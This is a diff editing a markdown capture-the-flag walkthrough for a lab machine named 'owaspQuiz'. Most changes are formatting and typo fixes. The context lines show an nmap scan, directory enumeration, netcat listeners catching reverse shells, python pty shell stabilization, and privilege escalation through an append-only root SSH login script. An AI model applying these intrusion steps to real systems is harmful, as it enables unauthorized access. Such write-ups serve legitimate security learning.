@@ -26,7 +26,7 @@ Lets start with enumerations as it was proposed by
 
 ## nmap scan 
 ```bash
-nmap  -sC -sV 10.10.176.162 -oN nmap-scan
+nmap  -sC -sV 10.9.11.230 -oN nmap-scan
 ```
 
 ```bash
@@ -80,7 +80,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /gallery.php          (Status: 200) [Size: 3050]                                    
 /admin                (Status: 301) [Size: 316] [--> http://192.168.56.103/admin/]  
 /assets               (Status: 301) [Size: 317] [--> http://192.168.56.103/assets/] 
-^C
+
 [!] Keyboard interrupt detected, terminating.
 ===============================================================
 2022/05/21 16:56:52 Finished
@@ -153,7 +153,7 @@ And after navigating t o gallery page, `Boom!!!` on our netcat we have a shell a
 ```bash
 └─$ nc -nlvp 4444                             
 listening on [any] 4444 ...
-connect to [172.17.17.62] from (UNKNOWN) [172.17.17.87] 33924
+connect to [x.x.x.x] from (UNKNOWN) [x.x.x.x] 33924
 Linux owaspQuiz 5.4.0-110-generic #124-Ubuntu SMP Thu Apr 14 19:46:19 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
  14:04:37 up  1:22,  0 users,  load average: 0.18, 0.54, 0.40
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -169,7 +169,7 @@ $
 **We are in.**
 -- -
 ## Stabilize shell.
-Now we have shell but it is not stable meaning if we press ctr+c the shell will lost then here are some of the steps.
+Now we have shell but if it is not stable meaning if we press `ctr+c` the shell will lost then here are some of the steps.
 
 ```bash
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -359,9 +359,10 @@ fi
 ```
 
 So the script as seen is aimed to run at every ssh login. And after some research, The script runn with root permission.
+
 **NOTE**
- The scri>[!NOTE]pt seems to have some immutable file attributes as shown below. It allows only `append mode!!` using `lsattr` command to view permissions of file.
->
+> The script seems to have some immutable file attributes as shown below. It allows only `append mode!!` using `lsattr` command to view permissions of file.
+
 
 ```bash
 munojr@owaspQuiz:/usr/local/sbin$ lsattr ssh-alert.sh 
@@ -403,6 +404,7 @@ munojr@owaspQuiz:/usr/local/sbin$
 
 
 Then login to the system with `id_rsa` and listen to another shell with netcat 
+
 ```bash
 └─$ ssh munojr@192.168.56.103 -i id_rsa
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)
@@ -429,7 +431,7 @@ You have new mail.
 
 ```
 
-In the other netcatt listener.
+In the other netcat listener.
 
 ```bash
 ─$ nc -nlvp 1234
